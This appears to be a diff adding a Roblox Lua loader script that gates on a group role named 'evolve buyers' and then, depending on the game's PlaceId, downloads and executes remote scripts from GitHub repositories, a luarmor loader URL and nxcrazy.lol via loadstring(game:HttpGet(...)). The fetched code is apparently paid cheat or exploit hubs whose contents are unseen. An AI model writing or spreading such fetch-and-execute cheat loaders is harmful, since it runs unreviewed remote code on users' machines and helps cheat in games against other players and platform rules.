@@ -1,0 +1,38 @@
+local PlaceId = game.PlaceId
+local player = game.Players.LocalPlayer
+
+-- Set your group ID and required role name
+local requiredGroupId = 35602864
+local requiredRoleName = "evolve buyers"
+
+-- Function to check if the player is in the group and has the required role
+local function hasRequiredRole()
+    local groupInfo = player:GetRoleInGroup(requiredGroupId)
+    return groupInfo == requiredRoleName
+end
+
+-- Check if the player meets the group and role conditions
+if not player:IsInGroup(requiredGroupId) then
+    print("You are not in the required group.")
+    return
+end
+
+if not hasRequiredRole() then
+    print("You do not have the required role in the group.")
+    return
+end
+
+-- If the player passes the group and role checks, continue with the PlaceId check
+if PlaceId == 286090429 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv1.3"))()
+elseif PlaceId == 6229116934 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/bdheheman/Zenware-mob-source/refs/heads/main/updatedbestw-2.txt"))()
+elseif PlaceId == 17625359962 then
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/47fc2ea07fef3d78fb68ca87ab2b7503.lua"))()
+elseif PlaceId == 11158043705 then
+    loadstring(game:HttpGet('https://nxcrazy.lol/BADDIES'))()
+elseif PlaceId == 13772394625 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Avorrietz/Ghostobfuscate/refs/heads/main/SGC"))()
+else
+    print("This is not the correct game place.")
+end
